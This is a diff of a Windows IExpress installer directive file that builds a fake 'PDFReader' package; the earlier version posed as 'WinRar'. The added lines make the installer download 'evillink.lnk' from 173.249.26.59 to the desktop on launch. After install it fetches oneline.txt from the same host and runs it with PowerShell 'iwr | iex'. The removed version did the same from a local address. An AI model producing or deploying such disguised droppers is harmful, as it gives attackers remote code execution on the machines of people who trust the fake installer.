@@ -20,17 +20,18 @@ PostInstallCmd=%PostInstallCmd%
 AdminQuietInstCmd=%AdminQuietInstCmd%
 UserQuietInstCmd=%UserQuietInstCmd%
 SourceFiles=SourceFiles
+ExtractorStub=
 [Strings]
-InstallPrompt=Oh cool
+InstallPrompt=
 DisplayLicense=
-FinishMessage=congrats
-TargetName=C:\Users\win11\Downloads\winrar-32-7.01-installer_QOz-dq1.exe
-FriendlyName=WinRar
-AppLaunched=explore.exe
-PostInstallCmd="powershell iex(new-object net.webclient).downloadstring('http://192.168.10.18:9999/noo.lnk')"
-AdminQuietInstCmd=cmd.exe
-UserQuietInstCmd=powershell
-FILE0="explore.exe"
+FinishMessage=
+TargetName=C:\Users\win11\Downloads\PDFReader.EXE
+FriendlyName=PDFReader
+AppLaunched="cmd.exe /c powershell -c (new-object System.Net.WebClient).DownloadFile('http://173.249.26.59:8443/evillink.lnk',[Environment]::GetFolderPath('Desktop')+'\evillink.lnk')"
+PostInstallCmd="powershell -c start (iwr http://173.249.26.59:8443/oneline.txt | iex)"
+AdminQuietInstCmd=
+UserQuietInstCmd=
+FILE0="calc.exe"
 [SourceFiles]
 SourceFiles0=C:\Windows\System32\
 [SourceFiles0]
